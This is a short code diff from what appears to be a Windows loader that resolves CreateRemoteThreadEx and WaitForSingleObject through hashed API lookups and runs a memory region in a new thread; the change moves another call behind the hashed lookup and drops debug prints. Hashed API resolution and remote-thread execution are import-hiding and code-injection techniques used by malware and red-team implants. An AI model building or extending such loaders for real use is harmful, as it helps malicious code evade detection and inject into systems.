@@ -7,8 +7,7 @@
 
 BOOL execution_load_apis() {
 	g_ldr->apis->CreateRemoteThreadEx = (pCreateRemoteThreadEx)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEREMOTETHREADEX);
-	DBGA("mine: 0x%08x\n", g_ldr->apis->CreateRemoteThreadEx);
-	DBGA("mine: 0x%08x\n", GetProcAddress(g_ldr->apis->modules.kernel32, "CreateRemoteThreadEx"));
+	g_ldr->apis->WaitForSingleObject = (pWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_WAITFORSINGLEOBJECT);
 	return TRUE;
 }
 
@@ -18,7 +17,7 @@ BOOL execution_run(MemoryInfo memInfo) {
 		NULL,
 		0, NULL, NULL);
 	if (hThread == NULL) return FALSE;
-	WaitForSingleObject(hThread, INFINITE);
+	g_ldr->apis->WaitForSingleObject(hThread, INFINITE);
 	return TRUE;
 }
 
